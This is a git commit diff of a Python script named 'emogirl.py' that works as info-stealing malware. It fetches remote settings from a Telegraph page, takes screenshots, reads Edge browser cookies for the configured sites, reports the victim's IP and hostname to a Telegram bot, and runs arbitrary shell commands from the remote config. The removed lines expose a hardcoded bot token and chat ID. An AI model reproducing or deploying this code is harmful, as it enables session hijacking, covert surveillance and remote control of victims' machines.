f51628c4cf40a22a92defc02015cb535cce2e595
Nikita Balajew <102317425+chopa113@users.noreply.github.com>
2024-04-25 21:24:59 +0200

    Big changes from local saves
    Now is OOP and also im add requirements.txt pip install -r <patht to requerments.txt>

--- emogirl.py
+++ emogirl.py
@@ -9,109 +9,91 @@ import json
 import time
 import browser_cookie3
 
-token = "6192337221:AAESogPJK-_5wcjISHftUaJFnxDvS5kxtsE"
-chat_id = "1104502854"
-telegraph_url = "https://api.telegra.ph/getPage/emogirl-03-08?return_content=false"
-#https://telegra.ph/emogirl-03-08
 
-def getCookiesFromDomain(domain,cookieName=''):
+class Main():
+    def __init__(self):
+        self.token = input("input your Telegram token: ")
+        self.chat_id = input("input your chat id: ")
+        self.telegraph_url = input("input telegraph url: ")
 
-    Cookies={}
-    chromeCookies = list(browser_cookie3.edge())
+    def getCookiesFromDomain(self, domain, cookieName=''):
+        Cookies = {}
+        chromeCookies = list(browser_cookie3.edge())
 
-    for cookie in chromeCookies:
+        for cookie in chromeCookies:
+            if (domain in cookie.domain):
+                Cookies[cookie.name] = cookie.value
 
-        if (domain in cookie.domain):
-            Cookies[cookie.name]=cookie.value
+        if(cookieName != ''):
+            try:
+                return Cookies[cookieName]
+            except:
+                return {}
+        else:
+            return Cookies
 
-    if(cookieName!=''):
-        try:
-            return Cookies[cookieName]
-        except:
-            return {}
-    else:
-        return Cookies
+    def get_config(self):
+        return requests.get(self.telegraph_url).text.split('\n')
 
-def get_config():
-    return requests.get(telegraph_url).text.split('\n')
+    def get_ip(self):
+        ip = requests.get('https://api.ipify.org').text
+        return ip
 
-def get_ip():
-    ip = requests.get('https://api.ipify.org').text
-    return ip
+    def get_hostname(self):
+        hostname = socket.gethostname()
+        return hostname
 
-def get_hostname():
-    hostname = socket.gethostname()
-    return hostname
+    def main(self):
+        config = json.loads(json.loads(self.get_config()[0])['result']['description'])
 
+        if config['enable'] == False:
+            exit(0)
 
+        time.sleep(config['delay'])
 
-def main():
-    config = json.loads(json.loads(get_config()[0])['result']['description']) #get config from telegraph and convert to json
-    
-    
+        d_ip, d_hostname = "None", "None"
+        chat_id = self.chat_id
+        bot = telebot.TeleBot(self.token)
+        randname = f"{self.get_hostname()}-{str(random.randint(111111,999999))}"
 
-    #{'enable': True, 'chat_id': '1251285260', 'send_message': True, 'delay': 0, 'get_settings': {'get_ip': True, 'get_hostname': True, 'take_screenshot': True}, 'shell_commands': []}
-    if config['enable'] == False:
-        exit(0)
+        if config['get_settings']['get_ip'] == True:
+            d_ip = self.get_ip()
+        if config['get_settings']['get_hostname'] == True:
+            d_hostname = self.get_hostname()
+        if config['get_settings']['take_screenshot'] == True:
+            try:
+                screen = ImageGrab.grab()
+                screen.save(os.getcwd() + f'\\screen{randname}.jpg')
+            except Exception as err:
+                print(err)
+                bot.send_message(chat_id, f'error: {err} ')
+        d_date = datetime.now()
 
-    time.sleep(config['delay'])
+        data = f"""
+        ip: {d_ip}
+        hostname: {d_hostname}
+        date: {d_date}
+        """
 
-    d_ip, d_hostname = "None", "None"
-    chat_id = config['chat_id']
-    bot = telebot.TeleBot(token)
-    randname = f"{get_hostname()}-{str(random.randint(111111,999999))}"
+        if(config['get_settings']['take_screenshot'] == True):
+            try:
+                bot.send_photo(chat_id, open(f'screen{randname}.jpg', 'rb'), data)
+            except:
+                pass
+        else:
+            bot.send_message(chat_id, data)
 
+        if(config['get_settings']['get_cookies'] == True):
+            with open(f'cookies{randname}.txt', 'w') as f:
+                for domain in config['get_settings']['cookie_websites']:
+                    f.write(f"{domain}:\n{self.getCookiesFromDomain(domain)}\n\n")
+            bot.send_document(chat_id, open(os.getcwd() + f'\\cookies{randname}.txt', 'rb'))
 
-    if config['get_settings']['get_ip'] == True:
-        d_ip = get_ip()
-    if config['get_settings']['get_hostname'] == True:
-        d_hostname = get_hostname()
-    if config['get_settings']['take_screenshot'] == True:
-        try:
-            screen = ImageGrab.grab()
-            screen.save(os.getcwd() + f'\\screen{randname}.jpg')
-        except Exception as err:
-            print(err)
-            bot.send_message(chat_id, f'error: {err} ')
-    d_date = datetime.now()
-    
-    data = f"""
-ip: {d_ip}
-hostname: {d_hostname}
-date: {d_date}
-"""
-
-
-    if(config['get_settings']['take_screenshot'] == True):
-        try:
-            bot.send_photo(chat_id, open(f'screen{randname}.jpg', 'rb'), data)
-        except:
-            pass
-    else:
-        bot.send_message(chat_id, data)
-
-
-
-
-
-    
-    
-    print(config)
-
-    if(config['get_settings']['get_cookies'] == True):
-        with open(f'cookies{randname}.txt', 'w') as f:
-            for domain in config['get_settings']['cookie_websites']:
-                # print(domain)
-                # print(getCookiesFromDomain(domain))
-                # bot.send_message(chat_id, f"{domain}:\n{getCookiesFromDomain(domain)}")
-                f.write(f"{domain}:\n{getCookiesFromDomain(domain)}\n\n")
-        bot.send_document(chat_id, open(os.getcwd()+f'\\cookies{randname}.txt', 'rb'))
-
-    for command in config['shell_commands']:
-        print(command)
-        os.system(command)
+        for command in config['shell_commands']:
+            print(command)
+            os.system(command)
 
 
-
-
-main()
+if __name__ == "__main__":
+    main_instance = Main()
+    main_instance.main()
